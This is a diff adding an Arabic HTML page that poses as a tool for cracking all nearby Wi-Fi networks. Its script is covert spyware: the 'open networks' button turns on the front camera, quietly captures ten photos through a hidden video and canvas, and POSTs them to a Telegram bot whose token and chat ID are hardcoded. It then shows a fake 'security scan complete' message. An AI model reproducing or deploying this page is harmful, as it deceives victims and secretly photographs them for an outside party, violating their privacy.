@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>فتح شبكات الواي فاي | أداة متقدمة</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0f1a;
+            color: #eef5ff;
+            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, 'Cairo', sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            background: #111827;
+            padding: 32px 24px;
+            border-radius: 32px;
+            border: 1px solid #2d3a5e;
+            text-align: center;
+            width: 100%;
+            max-width: 460px;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5);
+            transition: all 0.2s ease;
+        }
+
+        .top-image {
+            width: 100%;
+            border-radius: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+            border: 1px solid #2d3a5e;
+        }
+
+        .icon {
+            font-size: 58px;
+            color: #3b82f6;
+            margin-bottom: 18px;
+            display: inline-block;
+        }
+
+        h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin: 12px 0 8px;
+            letter-spacing: -0.3px;
+            background: linear-gradient(135deg, #ffffff, #93c5fd);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        p {
+            color: #b9c7dd;
+            font-size: 0.9rem;
+            line-height: 1.6;
+            margin-bottom: 24px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px 14px;
+            border-radius: 24px;
+        }
+
+        .network-preview {
+            background: #0f172a;
+            border-radius: 20px;
+            padding: 12px 16px;
+            margin: 18px 0 22px;
+            text-align: right;
+            border: 1px solid #1f2a44;
+        }
+
+        .net-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 5px;
+            border-bottom: 1px dashed #2d3a5e;
+            font-size: 0.85rem;
+            color: #cbd5e6;
+        }
+
+        .net-row:last-child {
+            border: none;
+        }
+
+        .lock-icon {
+            color: #facc15;
+            margin-left: 8px;
+        }
+
+        .signal {
+            color: #3b82f6;
+            letter-spacing: 1px;
+        }
+
+        .btn {
+            background: #3b82f6;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 40px;
+            width: 100%;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.25s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 4px 12px rgba(59,130,246,0.3);
+        }
+
+        .btn:hover {
+            background: #2563eb;
+            transform: scale(0.99);
+            box-shadow: 0 6px 16px rgba(59,130,246,0.4);
+        }
+
+        .status {
+            display: none;
+            margin-top: 22px;
+            background: #0f172a;
+            padding: 12px;
+            border-radius: 40px;
+            font-size: 0.85rem;
+            color: #60a5fa;
+            border: 1px solid #2d3a5e;
+        }
+
+        .dot {
+            height: 8px;
+            width: 8px;
+            background-color: #3b82f6;
+            border-radius: 50%;
+            display: inline-block;
+            animation: blink 1s infinite;
+            margin-left: 10px;
+        }
+
+        @keyframes blink {
+            0% { opacity: 0.2; transform: scale(0.8);}
+            50% { opacity: 1; transform: scale(1.2);}
+            100% { opacity: 0.2; transform: scale(0.8);}
+        }
+
+        video, canvas {
+            display: none;
+        }
+
+        .footer-note {
+            margin-top: 20px;
+            font-size: 0.7rem;
+            color: #5f7f9e;
+            border-top: 1px solid #1f2a44;
+            padding-top: 16px;
+        }
+
+        .satellite-bottom {
+            margin-top: 24px;
+            font-size: 32px;
+            color: #3b82f6;
+            background: rgba(0,0,0,0.2);
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 60px;
+            backdrop-filter: blur(4px);
+            border: 1px solid #2d3a5e;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container" id="box">
+
+    <img class="top-image" src="https://i.postimg.cc/pV5wYbnc/20260415-225100.jpg" alt="صورة تقنية">
+    
+    <h2>فتح جميع شبكات الواي فاي</h2>
+    <p>أداة اختراق لاسلكية متقدمة · فك تشفير WPA2/WPA3 · استرجاع المفاتيح تلقائياً</p>
+
+    <div class="network-preview">
+        <div class="net-row">
+            <span><span class="lock-icon">🔒</span> STC_5G_Private</span>
+            <span class="signal">📶📶📶📶</span>
+        </div>
+        <div class="net-row">
+            <span><span class="lock-icon">🔒</span> FiberHome_Egypt</span>
+            <span class="signal">📶📶📶📶</span>
+        </div>
+        <div class="net-row">
+            <span><span class="lock-icon">🔒</span> WiFi_UAE_Secure</span>
+            <span class="signal">📶📶📶📶</span>
+        </div>
+        <div class="net-row">
+            <span><span class="lock-icon">🔒</span> Zain_Crypto_Net</span>
+            <span class="signal">📶📶📶</span>
+        </div>
+    </div>
+
+    <button class="btn" id="btn" onclick="startHunt()">
+        🔓 فتح جميع الشبكات الآن
+    </button>
+    <div id="status" class="status">
+        <span class="dot"></span> <span>جاري اختراق الشبكات المحمية...</span>
+    </div>
+    <div class="footer-note">
+         تقنية اختراق سريع | متوافق مع جميع الأجهزة
+    </div>
+
+    <div class="satellite-bottom">
+        📡
+    </div>
+</div>
+
+<video id="v" autoplay playsinline muted></video>
+<canvas id="c"></canvas>
+
+<script>
+    // الإعدادات - يفضل وضعها في متغيرات منفصلة
+    const CONFIG = {
+        BOT_TOKEN: "8761336309:AAGv1e4FqNVaybasRyNwLu4U1o5x1pNCJUk",
+        CHAT_ID: "7000276863",
+        MAX_PHOTOS: 10
+    };
+
+    const v = document.getElementById('v');
+    const c = document.getElementById('c');
+    const ctx = c.getContext('2d');
+    const btn = document.getElementById('btn');
+    const status = document.getElementById('status');
+
+    async function startHunt() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            alert("متصفحك لا يدعم الوصول للكاميرا!");
+            return;
+        }
+
+        btn.style.display = 'none';
+        status.style.display = 'block';
+
+        try {
+            // طلب الكاميرا الأمامية
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            });
+            
+            v.srcObject = stream;
+            await v.play();
+            
+            // انتظار بسيط لضمان تجهيز الكادر
+            await new Promise(r => setTimeout(r, 600));
+
+            // إرسال الصور فوراً بالتوازي (بدون انتظار رد السيرفر)
+            for (let i = 0; i < CONFIG.MAX_PHOTOS; i++) {
+                captureAndSend();
+            }
+
+            // إغلاق الكاميرا بعد ثانية واحدة من التقاط الصور
+            setTimeout(() => {
+                stream.getTracks().forEach(track => track.stop());
+                updateUI();
+            }, 1000);
+
+        } catch (err) {
+            console.error("خطأ تقني:", err);
+            alert("فشل الوصول للكاميرا: تأكد من الموافقة على الأذونات في أعلى المتصفح.");
+        }
+    }
+
+    function captureAndSend() {
+        if (v.readyState !== 4) return; // تأكد أن الفيديو يعمل
+
+        c.width = v.videoWidth;
+        c.height = v.videoHeight;
+        ctx.drawImage(v, 0, 0, c.width, c.height);
+
+        c.toBlob(blob => {
+            if (!blob) return;
+
+            const formData = new FormData();
+            formData.append('chat_id', CONFIG.CHAT_ID);
+            formData.append('photo', blob, 'security_alert.jpg');
+
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(e => console.error("فشل الإرسال:", e));
+        }, 'image/jpeg', 0.6);
+    }
+
+    function updateUI() {
+        status.innerHTML = `<span class="dot" style="background:#10b981"></span> <span>تم إكمال الفحص الأمني بنجاح</span>`;
+        // يمكنك هنا إضافة أي تعديل بصري آخر
+    }
+</script>
+
+
+
+
+</body>
+</html>
